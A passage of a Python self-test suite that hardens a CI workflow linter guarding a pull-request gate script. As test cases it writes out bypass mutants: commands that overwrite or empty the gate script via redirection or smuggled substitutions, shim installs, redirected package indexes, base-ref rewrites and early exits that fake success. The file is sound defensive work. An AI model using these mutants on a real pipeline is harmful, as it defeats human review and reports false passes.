          len(parts('echo "a; b"; exit 0')) == 2)
    check("the step-reachability rule rejects an early exit on its own line",
          escapes_early(as_step("set -euo pipefail", "exit 0",
                               "python scripts/ai/pr_gate.py ${SEL}")))
    check("that rule accepts an exit nested in a block, which is conditional on it",
          not escapes_early({"run": "\n".join((" " * 10 + 'if [ "$x" = 1 ]; then',
                                              " " * 12 + "exit 2",
                                              " " * 10 + "fi"))}))
    check("that rule accepts a single-line guarded exit, which opens with `if`",
          not escapes_early(as_step('if [ "$c" -ne 2 ]; then exit "$c"; fi')))
    # The three shapes the line-prefix reading missed. Each was a live false green in the branch-scope
    # step: every command is in `permitted()`'s vocabulary, the invocation and its `code=$?` are
    # untouched, and the shell is gone before either runs.
    for label, snippet in (("an exit after a harmless command on one line", "true; exit 0"),
                           ("an exit reached through a no-op", ": && exit 0"),
                           ("an exit guarded by a condition that always holds",
                            "[ 1 = 1 ] && exit 0"),
                           # Openers whose condition is a no-op. Exempting on the keyword alone let
                           # these through: as unconditional as a bare `exit 0`, spelled as a block.
                           ("an exit under an opener with no real test", "if : ; then exit 0; fi"),
                           ("an exit under a loop with no real test",
                            "while :; do exit 0; done")):
        check(f"that rule rejects {label}", escapes_early(as_step(snippet)), snippet)
    for label, snippet in (("an always-true test, which conditions nothing",
                            "if [ 1 = 1 ]; then exit 0; fi"),
                           ("a word that merely looks like a test",
                            "if grep -q test x; then exit 0; fi")):
        check(f"the reachability rule rejects an exit under {label}",
              escapes_early(as_step(snippet)), snippet)
    for label, snippet, early in (
            ("a handler that re-raises the failure it caught",
             'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 1; }', False),
            ("a handler that re-raises the captured status",
             'python scripts/ai/pr_gate.py ${SEL} || { echo "x"; exit "$code"; }', False),
            ("a handler that replaces the failure with success",
             'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 0; }', True),
            ("a bare conditional exit 0", "python scripts/ai/pr_gate.py ${SEL} || exit 0", True),
            # `$?` is the status of whatever ran last, so it hands on a failure only after `||`. Read
            # as re-raising after `&&` too, `sleep 0 && exit $?` ended a step clean before its checker
            # ran, with every rule green — a live false green a review found in the real workflow.
            ("the captured status re-raised after a success",
             "sleep 0 && exit $?", True),
            ("the captured status re-raised after a failure",
             "python scripts/ai/pr_gate.py ${SEL} || exit $?", False),
            # bash truncates an exit status to 8 bits, so these two exit 0.
            ("a handler exiting a status bash truncates to zero",
             'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 256; }', True),
            ("a handler exiting a status that survives truncation",
             'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 257; }', False),
            # Decided tests, whatever their arity: `!` inverts one and `-a`/`-o` join two. Every branch
            # of `decided` fell through to "real condition" past three operands, so both of these
            # guarded an unconditional exit that read as conditional.
            ("an exit under an always-true negated test",
             "if [ ! 1 = 2 ]; then exit 0; fi", True),
            ("an exit under an always-true conjunction",
             "if [ 1 = 1 -a 1 = 1 ]; then exit 0; fi", True),
            ("an exit under an always-false disjunction",
             "if [ 1 = 2 -o 1 = 2 ]; then exit 0; fi", True),
            # …but a *file* test is a runtime probe, not a literal comparison, so an early-out guarded
            # by one is a real condition. Called decided by operand count alone, a legitimate guard was
            # reported as an unconditional exit.
            ("an exit under a file test", "if [ -f /some/marker ]; then exit 0; fi", False),
            ("an exit under a directory test", "if [ -d /some/dir ]; then exit 0; fi", False)):
        check(f"the reachability rule reads {label} as {'an early exit' if early else 'reachable'}",
              bool(escapes_early(as_step(snippet))) is early, snippet)
    check("and still accepts the retry loop's real guarded exit",
          not escapes_early(as_step('if [ "$code" -ne 2 ]; then exit "$code"; fi')))
    check("the annotation exception admits the brace-group handler this file calls a correct edit",
          annotation_only('{ echo "::error::selection was empty"'))
    check("and still refuses a state-changing workflow command however it is wrapped",
          not annotation_only('{ echo "::set-output name=ref::HEAD"'))
    check("masking is judged on what follows the command, not the whole line, so a cleanup "
          "before the real call is still accepted",
          executes("          rm -f gate.log || true; python scripts/ai/pr_gate.py ${SEL}",
                   "scripts/ai/pr_gate.py"))
    for mask in ("|| echo warn", "|| /bin/true", "|| command true", "|| builtin true"):
        check(f"masking with `{mask}` is rejected",
              not executes(f"          python scripts/ai/pr_gate.py ${{SEL}} {mask}",
                           "scripts/ai/pr_gate.py"))
    check("a handler that re-raises is not masking",
          executes('          python scripts/ai/pr_gate.py ${SEL} || { echo "::error::"; exit 1; }',
                   "scripts/ai/pr_gate.py"))
    # The retry loop is only sound because of the exit contract: 2 is a tool error and worth
    # another attempt, 0 and 1 are verdicts and final. Widening that comparison would turn three
    # attempts into three chances to miss a real FOREIGN/STACKED finding, so the shape is pinned.
    # Unconditional, which it was not: guarding this with `if "while" in shell` made the rule
    # conditional on the very token it protects, so replacing the loop with a one-shot
    # `set +e; …; code=$?` that never exits with `$code` skipped *both* checks. That mutation was
    # caught only by the total-count invariant — and its failure message says "update EXPECTED
    # deliberately", so the natural response to it merges the defect. A guard that disappears with
    # the thing it guards is worse than no guard, because the suite still reports success.
    check("the checker's exit code is what the step exits with, whatever the retry shape",
          re.search(r'if \[ "\$code" -ne 2 \]; then exit "\$code"; fi', shell), shell)
    check("that rule rejects a loop that retries a verdict",
          not re.search(r'if \[ "\$code" -ne 2 \]; then exit "\$code"; fi',
                        'if [ "$code" -eq 0 ]; then exit "$code"; fi'))
    check("that rule rejects a one-shot that captures the code and never exits with it",
          not re.search(r'if \[ "\$code" -ne 2 \]; then exit "\$code"; fi',
                        'set +e\npython check.py "$@"\ncode=$?\nset -e\necho "exited ${code}"'))

    # Every pip install must come from --requirements. Checking for two literal pin spellings
    # missed `cumulusci~=4.8.1` and `setuptools<77`; naming the operators would still miss an
    # unpinned `pip install requests`. So the rule inverts: an install line may reference
    # ${reqs} or upgrade pip, and nothing else. It needs no list of packages and so cannot
    # drift from PINS/CO_REQUIRES/deps as those change.
    # Third instance of the substring-filter shape in this file (after `ref_lines` and `sel_lines`):
    # keyed on the text `pip install`, it fired on `echo "::group::pip install"`, which installs
    # nothing, and told the reader they had restated a pin. Read per segment, and only when the
    # segment's command *is* pip.
    def runs_pip(seg):
        """Is this segment a pip invocation, in any spelling that reaches pip?

        Narrowed to bare `python -m pip` and `pip`, this missed `python3 -m pip`, `pip3`, and either
        behind a block keyword (`if …; then pip install …`). Those were still refused — but by the
        vocabulary rule, whose message is about shimming the interpreter, not about a dependency
        restated in place of `--requirements`. A rule that hands its diagnosis to another rule reads
        as a bug in that other rule.
        """
        words = seg.split()
        while words and words[0] in KEYWORDS:
            words = words[1:]
        # `VAR=1 pip …`, `sudo pip …` and `env pip …` all reach pip; skipping those prefixes keeps
        # the diagnosis here rather than handing it to the vocabulary rule.
        while words and (re.match(r"^[A-Za-z_]\w*=", words[0])
                         or words[0] in ("sudo", "env")
                         or (words[0].startswith("-") and len(words) > 1)):
            words = words[1:]
        if not words:
            return False
        # Version-suffixed and absolute spellings reach pip too: `pip3.13`, `/usr/bin/pip`,
        # `python3.13 -m pip`. Matched on the basename with any version suffix stripped, because
        # enumerating `python3` and stopping there is what left `python3.13` to another rule.
        exe = re.sub(r"3(\.\d+)*$", "", words[0].rsplit("/", 1)[-1])
        if exe in ("pip",):
            return True
        return exe in ("python",) and any(
            a in ("-m", "-mpip") for a in words[1:2]) and (
            words[1:3] == ["-m", "pip"] or words[1:2] == ["-mpip"])

    for spelling in ("pip install requests", "pip3 install requests",
                     "python -m pip install requests", "python3 -m pip install requests",
                     "then pip install requests", "pip3.13 install requests",
                     "python3.13 -m pip install requests", "/usr/bin/pip install requests",
                     "python -mpip install requests", "sudo pip install requests",
                     "env pip install requests", "PIP_NO_INPUT=1 pip install requests",
                     # The assignment-prefix strip applied the *basename* logic meant for
                     # `/usr/bin/pip` to the assignment as well, so any value containing a slash took
                     # its last path segment — where the `=` no longer is — and the prefix was never
                     # skipped. `sudo -H` and `env -i` stopped the loop for the same reason. All were
                     # refused by another rule, under another rule's message.
                     "PATH=/tmp/shim pip install requests",
                     "PIP_INDEX_URL=https://example.invalid/simple pip install requests",
                     "sudo -H pip install requests", "env -i pip install requests"):
        check(f"the restated-dependency rule sees {spelling!r} as a pip invocation",
              runs_pip(spelling), spelling)
    check("and does not see a log line that merely names it",
          not runs_pip('echo "::group::pip install"'))
    # `pip2` is Python 2's installer and `./pip3.13` can be a checked-in script; a blanket `[\d.]+$`
    # strip turned both into the real pip.
    check("and does not read pip2 as a spelling of pip3", not runs_pip("pip2 install requests"))
    # `${reqs}`, not the bare word `reqs`: keyed on the substring, `pip install evil-reqs` read as
    # an install that came from --requirements. And the self-upgrade exemption is no longer anchored
    # at end-of-segment, which rejected `pip install --upgrade pip --quiet` — a correct edit that
    # cannot hide anything, since pip's exit code is unchanged.
    def self_upgrade(seg):
        """Is this the pip self-upgrade, however its flags are ordered?

        Matched as `pip install --upgrade pip`, adjacency and all, this rejected `-U pip`,
        `--quiet --upgrade pip` and `--upgrade --quiet pip` — the same command with its flags moved —
        and then reported them as a dependency restated in place of `--requirements`. Asked as an argv
        question, the way `git_form_ok` already asks it: the only package named is `pip`, and an
        upgrade flag is present somewhere.
        """
        words = seg.split()
        if "install" not in words or not runs_pip(seg):
            return False
        tail, packages, upgrading = words[words.index("install") + 1:], [], False
        i = 0
        while i < len(tail):
            word = tail[i]
            if word in ("--upgrade", "-U"):
                upgrading = True
            elif word in PIP_VALUE_OPTS:
                i += 1  # skip the option's value, which is not a package
            elif not word.startswith("-"):
                packages.append(word)
            i += 1
        return upgrading and packages == ["pip"]
    restated = [seg.strip() for ln in run_contents(wf) for seg, _ in parts(ln)
                if runs_pip(seg) and "install" in seg
                and not re.search(r"\$\{?reqs\}?", seg)
                and not self_upgrade(seg)]
    check("every dependency install comes from --requirements rather than being restated",
          not restated, restated)
    check("the gate is asked what to install in the first place",
          [ln for ln in run_contents(wf) if "--requirements" in ln], run_contents(wf))
    def restates(seg):
        return (runs_pip(seg) and "install" in seg and not re.search(r"\$\{?reqs\}?", seg)
                and not self_upgrade(seg))

    for spelling in ('pip install "cumulusci~=4.8.1"', "pip install setuptools<77",
                     "pip install requests", "pip install evil-reqs",
                     "pip3.13 install requests"):
        check(f"that rule catches a restated dependency: {spelling}", restates(spelling), spelling)
    for spelling in ('pip install -r "${reqs}"', "pip install --upgrade pip",
                     "pip install --upgrade pip --quiet", 'echo "::group::pip install"'):
        check(f"and accepts {spelling!r}, which restates nothing", not restates(spelling), spelling)

    # fetch-depth: 0 is load-bearing, not hygiene: past a shallow boundary `git diff base...HEAD`
    # exits 128 with "no merge base", which `git()` turns into exit 2 — a red tool error, not a
    # silent empty selection. Verified against a `--depth 1` clone. What the pin buys is a *usable*
    # diff; the danger it removes is a broken job, not a false green (the false green is one step
    # further on, in `--no-fetch`, which is why the two are asserted together below).
    # Read from the step's `with:` rather than matched as a substring —
    # `fetch-depth: 1 # was fetch-depth: 0` satisfied the substring form.
    checkouts = [s for s in (gate_job.get("steps") or [])
                 if str(s.get("uses", "")).startswith("actions/checkout")]
    depths = [str((s.get("with") or {}).get("fetch-depth")) for s in checkouts]
    check("history is fetched in full, so the merge base resolves", depths == ["0"], depths)
    # And the coupling, asserted rather than assumed: passing --no-fetch to the checker is only safe
    # because *this job* fetched full history moments earlier. Two settings in different steps, one
    # guarantee — if a future edit shallows the clone, the checker would compare against a stale
    # base and report clean, which test_branch_scope.py calls "the trap" precisely because it is a
    # silent exit 0 rather than an error.
    if len(found_scope) == 1:
        check("the step that skips fetching is in the same job as the full-history checkout",
              bool(no_fetch) and depths == ["0"] and found_scope[0] in (gate_job.get("steps") or []),
              f"no_fetch={bool(no_fetch)}, depths={depths}")

    # Every step of the job shares one working tree, so pinning the two load-bearing steps says
    # nothing about a *third* step rewriting what they run. `echo 'import sys; sys.exit(0)' >
    # scripts/ai/pr_gate.py` in the install step leaves the pinned gate command exactly as written and
    # makes it a no-op; so do `sed -i`, a `cp` in a new step, and a `pip install` of a shim. This is
    # the round-6 mistake — a rule scoped to the thing it protects — one level up, at job scope. So the
    # job is whitelisted whole: which steps exist, which actions they may use, and what their shell may
    # say. Four of these five shapes survived the round-8 suite.
    JOB_STEPS = ["Checkout repository", "Set up Python", "Resolve the base ref",
                 "Install only what the selection needs", "Run the gate", "Branch scope"]
    JOB_USES = {"Checkout repository": "actions/checkout", "Set up Python": "actions/setup-python"}
    # Tag or full commit SHA, and the SHA is the one to prefer: pinning to a 40-hex commit is how a
    # movable tag stops being trusted, and the first version of this rule compared the whole `uses:`
    # string against `@v6` — refusing the stronger pin while admitting the weaker one, for a rule
    # whose stated purpose is that neither action can patch the tree.
    REF = re.compile(r"^(v\d+(?:\.\d+){0,2}|[0-9a-f]{40})$")

    def pinned_use(value):
        """Split a `uses:` into its action and whether the ref is a tag or a commit SHA.

        A `docker://` image or a `./local-action` reference has no repository ref at all, so calling
        one "pinned" because the text after `@` looked like a tag was a substring answer to a
        structural question. Only `owner/repo@ref` can be pinned this way; anything else is unpinned
        by construction, which is the safe direction for the rule that consumes this.
        """
        action, sep, ref = str(value).partition("@")
        repo_form = bool(re.fullmatch(r"[\w.-]+/[\w./-]+", action)) and not action.startswith((".", "/"))
        ref = re.sub(r"^refs/tags/", "", ref)
        return action, bool(sep) and repo_form and bool(REF.match(ref))
    # `python -m pip` cannot be left open the way `git fetch` can: `pip install ${reqs} evil-shim`
    # installs whatever it is told, so the two install forms are pinned like everything else.
    PIP_FORMS = ("python -m pip install --upgrade pip", "python -m pip install ${reqs}")
    JOB_ASSIGN = ALLOWED_ASSIGN + (
        'reqs="$(python scripts/ai/pr_gate.py --requirements ${SEL})"',)
    # A redirection is how a step writes to the checkout, so its *target* is the rule. The four
    # GitHub-provided files are how steps legitimately pass values on; /dev/null is how `git rev-parse
    # --verify` stays quiet.
    # Two of these are legitimate *targets* whose contents another rule then refuses: nothing may be
    # written to `$GITHUB_PATH` at all, and a `$GITHUB_STEP_SUMMARY` write must be display-only. This
    # list answers "may a step redirect here"; `ALLOWED_WRITES` answers "may it write that".
    REDIR_TARGETS = ('"$GITHUB_OUTPUT"', '"$GITHUB_ENV"', '"$GITHUB_PATH"', '"$GITHUB_STEP_SUMMARY"',
                     "/dev/null")

    def permitted_job(seg):
        """Wider than `permitted()` — the other two steps resolve a ref and install pins — but still a
        whitelist of forms, not of words."""
        # Only a *leading* `!` is negation; elsewhere it is a literal argument, and dropping it
        # everywhere made these "exact form" compares accept `git fetch ! --no-tags origin …`.
        words = seg.split()
        while words and words[0] == "!":
            words = words[1:]
        while words and (words[0] in KEYWORDS or words[0] in ("if", "elif", "while", "until")):
            words = words[1:]
        if not words:
            return True
        w0 = words[0]
        # Assignments are compared whole, and exactly one of them — `reqs="$(python … )"` — needs a
        # command substitution, so that branch is reached before this one. Everywhere else a
        # substitution is a way to smuggle an arbitrary command inside a permitted one:
        # `echo "$(cp /dev/null scripts/ai/pr_gate.py)"` passes as a harmless echo, writes no
        # redirection this suite can see, and empties the script the gate is about to run.
        # `$(( ))` arithmetic, which the retry loop needs, is not a substitution.
        # Process substitution runs a command too, and `echo <(cp /dev/null scripts/ai/pr_gate.py)`
        # names no `$(`. It happens to die on the workflow-wide refusal of `<`, whose stated purpose is
        # heredocs — an incidental kill, and the kind this file has twice mistaken for a rule. Named
        # here so this rule stands on its own.
        # Not quote-aware, unlike `tokens`: `echo 'literally $(cmd)'` is refused although bash expands
        # nothing. That is a false rejection of inert text and is the safe direction — making it
        # quote-aware would reopen the double-quoted case the rule exists for.
        if not re.match(r"^[A-Za-z_][A-Za-z_0-9]*=", w0):
            if re.search(r"\$\((?!\()|<\(", seg) or "`" in seg:
                return False
        if not annotation_only(seg):
            return False
        # Fifth and last copy of this vocabulary. TEST_CMDS, not a fresh two-element tuple: this one
        # omitted `[[` and so rejected a respelling the other four had just been taught to accept —
        # which is what "sweep the class" means. `rg '"\["' on this file should find only TEST_CMDS.
        if w0 in HARMLESS or w0 in TEST_CMDS:
            return True
        if w0 == "printf":
            return "-v" not in words
        if w0 == "set":
            return set_line_ok(words)
        if re.match(r"^[A-Za-z_][A-Za-z_0-9]*=", w0):
            return re.sub(r"\s+", "", seg) in [re.sub(r"\s+", "", f) for f in JOB_ASSIGN]
        if w0 == "git":
            # Pinning the subcommand and not its arguments left the base ref writable *locally*:
            # `git fetch . "+HEAD:refs/remotes/origin/${BASE_REF}"` moves origin/<base> onto the PR
            # head, after which the export below is honest about a ref that now means HEAD, and the
            # gate diffs HEAD against itself.
            return git_form_ok(" ".join(words))
        if interpreter(w0) == "python":
            if len(words) > 1 and words[1] in SCRIPTS:
                return True
            # Flags after the pinned form are allowed — `--quiet` on the self-upgrade cannot hide
            # anything, since pip's exit code is unchanged, and rejecting it made this rule report a
            # restated dependency where nothing was restated. A pinned form followed by a *package*
            # is still refused, because only options begin with `-`.
            joined = strip_redir(" ".join(words))
            for form in PIP_FORMS:
                if joined == form:
                    return True
                if joined.startswith(form + " "):
                    return pip_tail_ok(joined[len(form):].split())
            # The self-upgrade was *also* pinned as a literal prefix here, so `-U pip` and
            # `--quiet --upgrade pip` — the same command with its flags moved — were refused by this
            # rule after `self_upgrade()` had already been taught to recognise them for the
            # restated-dependency rule. Two readers, two definitions, one of them a literal: the
            # pattern this file keeps re-learning. `self_upgrade()` is the definition, and it is
            # stricter than the prefix pin was, since it also insists `pip` is the only package named.
            if self_upgrade(joined):
                return True
        return False

    # Options whose value is a separate word. Deliberately excludes every option that names a
    # place to fetch code from (`-r`, `-e`, `--index-url`, `--extra-index-url`, `--find-links`,
    # `--target`, `--config-settings`): those turn a pinned install into an arbitrary one, so their
    # value would not be a value but a payload, and they stay refused along with bare packages.

    def pip_tail_ok(tail):
        """Are these the only things allowed after a pinned pip form — options, and their values?"""
        i = 0
        while i < len(tail):
            word = tail[i]
            if not word.startswith("-"):
                return False
            if word.split("=", 1)[0] in PIP_PAYLOAD_OPTS:
                return False
            if word in PIP_VALUE_OPTS:
                # Consume the value, and require there to be one: a trailing `--timeout` with no
                # value would otherwise let the next word through as an option's argument.
                if i + 1 >= len(tail) or tail[i + 1].startswith("-"):
                    return False
                i += 2
                continue
            i += 1
        return True

    def redirections(step):
        # The target stops at a separator: `>/dev/null; then` redirects to /dev/null, and reading the
        # `;` as part of the path made the workflow fail its own rule.
        return [ln.strip() for ln in shell_of(step)
                for m in re.finditer(r"(?<![0-9<>])>>?\s*([^\s;&|)]+)", ln)
                if m.group(1) not in REDIR_TARGETS]

    job_steps = gate_job.get("steps") or []
    found_steps = [s.get("name") for s in job_steps]
    check("the job runs exactly the steps it is built from, in order (JOB_STEPS) — order is pinned "
          "because `Resolve the base ref` must precede the step that reads `BASE`, and membership "
          "because all six share one working tree; edit JOB_STEPS to add, remove or move one",
          found_steps == JOB_STEPS,
          f"got {found_steps}, want {JOB_STEPS}" if found_steps != JOB_STEPS else found_steps)
    used = {s["name"]: s["uses"] for s in job_steps if "uses" in s}
    check("and uses only the two pinned actions, neither of which patches the tree (JOB_USES)",
          {n: pinned_use(v)[0] for n, v in used.items()} == JOB_USES, used)
    check("each pinned to a release tag or a commit SHA, so what runs before the gate is not a "
          "moving target",
          all(pinned_use(v)[1] for v in used.values()), used)
    for label, spelling, ok in (("a release tag", "actions/checkout@v6", True),
                                ("a full commit SHA", "actions/checkout@" + "a" * 40, True),
                                ("a branch name", "actions/checkout@main", False),
                                ("no ref at all", "actions/checkout", False)):
        check(f"that rule {'accepts' if ok else 'rejects'} {label}",
              pinned_use(spelling)[1] is ok, spelling)
    # Pinning *which* action runs says nothing about what it is pointed at, and checkout's inputs
    # decide what the whole job reads: `ref: ${{ github.base_ref }}` alongside `fetch-depth: 0`
    # checks out the base branch, so the diff is the base against itself, the selection is empty, and
    # the gate passes having chosen nothing — with every assertion above still green. The same
    # argument applies to the two steps' `env:` mappings, which is where the base ref this job diffs
    # against actually comes from: `BASE: HEAD` leaves both permitted `SEL` lines untouched and makes
    # the selection `HEAD...HEAD`. So the inputs are pinned alongside the identities.
    JOB_WITH = {"Checkout repository": {"fetch-depth": "0", "persist-credentials": "false"},
                "Set up Python": {"python-version": None}}
    JOB_ENV = {"Resolve the base ref": {"BASE_REF": "${{ github.base_ref }}"},
               "Install only what the selection needs": {"BASE": "${{ steps.base.outputs.ref }}"}}
    def inputs_of(step):
        """An action's inputs, dequoted, with values this suite does not pin shown as None.

        `python-version` is `None` because the *floor* rule owns its value: it asserts the runner is
        at least every suite's floor, which is the property, while this rule is about checkout not
        being redirected at another ref. Pinned as the literal `'"3.13"'`, it rejected `'3.13'` and
        `"3.13.1"` — a quoting change and a routine bump — under a message about checkout.
        """
        given = {k: _dequote(str(v)) for k, v in (step.get("with") or {}).items()}
        if step.get("name") in JOB_WITH:
            for key, pinned in JOB_WITH[step["name"]].items():
                if pinned is None and key in given:
                    given[key] = None
        return given

    check("each action's inputs are pinned, so checkout cannot be redirected at another ref "
          "(JOB_WITH; a value of None means another rule owns it)",
          {s["name"]: inputs_of(s) for s in job_steps if "with" in s} == JOB_WITH,
          {s.get("name"): inputs_of(s) for s in job_steps if "with" in s})
    # Filtered to `in JOB_ENV`, this rule would have been conditional on the thing it guards — a step
    # outside the map could carry any env at all. The set of env-bearing steps is pinned too; the
    # branch-scope step's own mapping is pinned separately as SCOPE_ENV.
    check("and the env of each step that feeds the selection is pinned to the event's base ref",
          {s["name"]: s["env"] for s in job_steps
           if "env" in s and s.get("name") in JOB_ENV} == JOB_ENV,
          {s.get("name"): s.get("env") for s in job_steps if "env" in s})
    check("with no other step carrying an env block this rule would not read",
          {s.get("name") for s in job_steps if "env" in s} == set(JOB_ENV) | {JOB_STEPS[5]},
          sorted({s.get("name") for s in job_steps if "env" in s}))
    for label, mutant in (("a checkout redirected at the base branch",
                           {"fetch-depth": "0", "persist-credentials": "false",
                            "ref": "${{ github.base_ref }}"}),
                          ("credentials left in the checkout for a later step to push with",
                           {"fetch-depth": "0", "persist-credentials": "true"})):
        check(f"that rule rejects {label}", mutant != JOB_WITH["Checkout repository"])
    for label, mutant in (("a base neutralised to HEAD", {"BASE": "HEAD"}),
                          ("a resolver pointed at the PR head",
                           {"BASE_REF": "${{ github.head_ref }}"})):
        check(f"the env rule rejects {label}", mutant not in JOB_ENV.values())
    # The token scopes are part of the contract too, and dropping one is silent: `gh pr view` in the
    # branch-scope step keeps working on a public repo with `contents: read` alone, and stops the day
    # this repo is private or mirrored internally — which is the regression this workflow already had
    # to fix once.
    # Exact, not a superset: a wider scope is the kind of change that should cost a conversation, and
    # the one a future edit is most likely to want (`checks: write`, to publish a neutral conclusion
    # for a tool error) is precisely the one worth arguing for rather than acquiring in passing.
    PERMISSIONS = {"contents": "read", "pull-requests": "read"}
    check("the workflow grants exactly the two token scopes the checker needs",
          doc.get("permissions") == PERMISSIONS, doc.get("permissions"))
    check("that rule notices a dropped pull-requests scope",
          {"contents": "read"} != PERMISSIONS)
    # Three more unpinned inputs, found by sweeping the rules above rather than by review. The runner
    # is the clearest: `runs-on: self-hosted` moves the gate onto a machine this repo does not control,
    # and a verdict from there means nothing. The job *name* is load-bearing for a different reason —
    # it is the string a branch ruleset matches when this check is made required, so renaming the job
    # silently un-requires it, which is the failure mode of the carry-out that is still open. The
    # concurrency group is the weakest of the three and is pinned on principle rather than on a
    # demonstrated bypass: made constant, one PR's run cancels another's, and a cancelled run is not a
    # pass but it is also not a verdict.
    # Any GitHub-hosted Ubuntu runner, not the `-latest` alias alone: pinning `ubuntu-24.04` is
    # ordinary hardening against alias drift, and rejecting it with "a runner this repository
    # controls" sent the reader looking for a self-hosted runner they had not added.
    check("the gate runs on a GitHub-hosted Ubuntu runner, not a self-hosted one",
          str(gate_job.get("runs-on") or "").startswith("ubuntu-"), gate_job.get("runs-on"))
    check("the job keeps the name a required-check rule would be written against",
          gate_job.get("name") == "Mechanical checks", gate_job.get("name"))
    check("runs are scoped per pull request, so one PR's run cannot cancel another's",
          (doc.get("concurrency") or {}).get("group")
          == "pr-checks-${{ github.event.pull_request.number || github.ref }}",
          (doc.get("concurrency") or {}).get("group"))
    # The one channel that reaches a later step without writing any file, so no destination-based rule
    # can see it. "Both whitelists refuse `::` outright" was too strong, and the overstatement mattered:
    # display-only annotations (`::error::`, `::notice::`, `::group::`) are admitted deliberately, since
    # a step that cannot annotate cannot explain its own failure. What is refused is a `::` command that
    # *sets state* — the four forms below.
    for label, mutant in (("a base ref set through a workflow command rather than a file",
                           'echo "::set-output name=ref::HEAD"'),
                          ("the deprecated environment form", 'echo "::set-env name=BASE::HEAD"'),
                          ("a matcher that rewrites how output is read",
                           'echo "::add-matcher::/tmp/m.json"'),
                          ("commands stopped so later lines are not parsed",
                           'echo "::stop-commands::tok"')):
        check(f"neither whitelist admits {label}",
              not permitted(mutant) and not permitted_job(mutant), mutant)
    check("and an ordinary echo still passes, so that rule is not a ban on echo",
          permitted('echo "no drift"') and permitted_job('echo "no drift"'))
    stray = [(s.get("name"), seg.strip()) for s in job_steps if "run" in s
             for ln in shell_of(s) for seg, _ in parts(ln) if not permitted_job(seg)]
    check("every command in every step is one the job exists to run, so no step can rewrite what a "
          "later one executes — the job-wide whitelists are HARMLESS, TEST_CMDS, NO_OPS, SCRIPTS, "
          "GIT_FORMS, PIP_FORMS, ALLOWED_SET and JOB_ASSIGN, and a segment containing `::` is "
          "refused unless it is a display-only annotation (a workflow command is parsed off stdout "
          "and crosses steps with no redirection for a rule to see); the segments are below",
          not stray, stray[:4])
    redirs = [(s.get("name"), r) for s in job_steps if "run" in s for r in redirections(s)]
    check("and every redirection writes to a GitHub-provided file or /dev/null, never into the "
          "checkout", not redirs, redirs[:4])
    for label, snippet in (("a script overwritten by a redirection",
                            "echo 'import sys; sys.exit(0)' > scripts/ai/pr_gate.py"),
                           ("a script rewritten through a glob, naming nothing",
                            "sed -i.bak 's/^/#/' scripts/ai/pr_g*.py"),
                           ("a stub copied over the directory", "cp /tmp/stub.py scripts/ai/"),
                           ("a shim installed alongside the pins",
                            "python -m pip install ${reqs} evil-shim"),
                           # Round 11: the vocabulary was pinned by word, not by argument. Both of
                           # these use nothing but whitelisted first words.
                           ("a fetch that moves the base ref onto the PR head",
                            'git fetch . "+HEAD:refs/remotes/origin/${BASE_REF}"'),
                           ("a verify of a ref nothing diffs against",
                            'git rev-parse --verify --quiet HEAD >/dev/null'),
                           ("a substitution hidden inside a permitted echo",
                            'echo "$(cp /dev/null scripts/ai/pr_gate.py)"'),
                           ("a substitution hidden in backticks",
                            "echo `cp /dev/null scripts/ai/pr_gate.py`"),
                           # Found by the local review pass, not by a hosted one, and live: this
                           # neutralised the selection with every other rule green.
                           ("an assignment smuggled through printf -v",
                            "printf -v SEL %s '--base HEAD'"),
                           ("a process substitution behind a permitted echo",
                            "echo <(cp /dev/null scripts/ai/pr_gate.py)")):
        step = as_step("set -euo pipefail", snippet)
        check(f"those two rules reject {label}",
              [seg for ln in shell_of(step) for seg, _ in parts(ln) if not permitted_job(seg)]
              or redirections(step), snippet)
    # Named, not sliced: `JOB_STEPS[2:4]` covered whichever two steps happened to sit at those
    # indices, so a reorder moved this assertion onto different steps without failing anything — the
    # positional-window mistake this file has already fixed twice elsewhere.
    for named in ("Resolve the base ref", "Install only what the selection needs"):
        matched = [s for s in job_steps if "run" in s and s.get("name") == named]
        offenders = [seg for s in matched
                     for ln in shell_of(s) for seg, _ in parts(ln) if not permitted_job(seg)]
        # The coverage half is not decoration: written without it, this assertion passed for a step
        # name that matched nothing — I mistyped one while making this very fix, and an empty
        # `offenders` list read as "accepted". A name-keyed rule has to fail when the name misses.
        check(f"and accept every command {named!r} needs to run, with that step actually present",
              len(matched) == 1 and not offenders,
              offenders or f"{len(matched)} steps named {named!r}")
    for spelling in ("python -m pip install --upgrade pip --quiet",
                     "python -m pip install ${reqs} --no-input"):
        check(f"a flag added to a pinned pip form is accepted: {spelling!r}",
              permitted_job(spelling), spelling)
    check("but a package appended to one is not",
          not permitted_job("python -m pip install ${reqs} evil-shim"))
    check("a seventh step is visible to the step-list rule",
          [s.get("name") for s in job_steps] + ["Prepare"] != JOB_STEPS)
    # Every rule so far reads a line, or a segment of one, in isolation — and a line's *enclosing
    # control flow* decides whether bash ever reaches it. `while :; do` → `while [ 1 = 2 ]; do` leaves
    # the invocation, the `code=$?` that follows it, the exit propagation and both command whitelists
    # exactly as written and never runs any of them; wrapping the gate step in `if [ 1 = 2 ]; then`
    # does the same to the gate. So the control flow of every step is pinned as an ordered sequence,
    # which also refuses a *reordering* or an inserted branch, not just a falsified condition. The
    # gate step's sequence is empty on purpose: it is three lines and needs no branching.
    # Only the two steps where falsifying a condition could produce a *pass*. It covered all four at
    # first, which cost a red run on four correct edits — a respelled `[ -z … ]` as `[ … = "" ]`, a
    # retry budget raised from 3 to 5, an explicit merge_group branch, a fetch guard rewritten as
    # `rev-parse || fetch` — and bought nothing in the other two: every command in the resolver and
    # the installer is argv-pinned below, so a skipped branch there ends as `--all` (more checks run)
    # or MISSING-DEP (a red gate), never a quiet green. A rule that fires on correct code is a rule
    # someone deletes, and this one had seven such lines to one load-bearing one.
    JOB_CONTROL = {
        "Run the gate": [],
        "Branch scope": ['if [ "${CROSS}" = "true" ]; then', "else", "fi", "while :; do",
                         'if [ "$code" -ne N ]; then exit "$code"; fi',
                         'if [ "$attempt" -ge N ]; then', "fi", "done"],
    }

    def control_flow(step):
        openers = ("if", "elif", "else", "fi", "while", "until", "for", "do", "done", "case", "esac",
                   "{", "}")
        # Integer literals are normalised to `N`: the retry budget is a tunable that lives inside a
        # condition, and pinning it by text rejected `-ge 5` — an edit the comment above this rule
        # already listed as a false rejection it had removed, in the one step where the loop lives.
        # The property is which branches exist and what they test, not how many attempts are allowed.
